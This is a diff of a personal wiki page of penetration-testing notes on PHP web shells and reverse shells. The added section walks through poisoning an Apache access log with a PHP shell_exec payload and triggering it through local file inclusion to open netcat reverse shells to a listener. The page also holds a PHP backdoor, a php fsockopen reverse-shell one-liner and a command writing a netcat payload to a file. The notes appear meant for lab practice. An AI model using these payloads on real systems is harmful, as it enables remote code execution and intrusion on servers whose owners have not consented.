@@ -1,9 +1,19 @@
 Content-Type: text/x-zim-wiki
 Wiki-Format: zim 0.6
 
-== PHP REVERSE SHELL ==
-evil.php%:
+== POISION THE ACCESS LOG WITH LFI ==
+#Connect with netcat 
+nc -nv [ip] 80
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 
+#Set up your netcat listener on your device
+nc -lvp 4444
+
+#Then navigate to the access bar and run the log with your command:
+**WINDOWS**: [URL].php?file=c:\xampp\apache\logs\access.log&cmd=nc 192.168.119.144 4444 -e cmd.exe
+**LINUX**: [URL].php?file=../../../var/log/apache/access.log&cmd=nc 192.168.119.144 4444 -e /bin/sh
+
+== PHP REVERSE SHELL ==
 <?php
 // simple backdoor
 system($_GET['cmd']);
@@ -15,12 +25,12 @@ One-Line CMD injection into PHP ( call using ?cmd='<command>'):
 in PHP Shell: <?php echo shell_exec(\$_GET[\'cmd\']); ?>
 
 then....
-cmd=nc [IP attack box] [port] -e /bin/sh (nc 172.16.3.1 4444 -e [[/bin/sh]]) 
+cmd=nc [IP attack box] [port] -e /bin/sh
 
 php -r '$sock=fsockopen("127.0.0.1",81);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 
-<?php echo "Are you sure you want to do this?  Type 'yes' to continue: "; $handle = fopen ("[[php://stdin]]","r"); $line = fgets($handle); if(trim($line) != 'yes'){echo "ABORTING!\n"; exit; }echo "\n"; echo "Thank you, continuing...\n"; ?>
+<?php echo "Are you sure you want to do this?  Type 'yes' to continue: "; $handle = fopen ("php://stdin","r"); $line = fgets($handle); if(trim($line) != 'yes'){echo "ABORTING!\n"; exit; }echo "\n"; echo "Thank you, continuing...\n"; ?>
 
 echo "<?php shell_exec(\'nc 172.16.3.1 4444 -e /bin/sh\'); ?>" > ../evil.txt
 
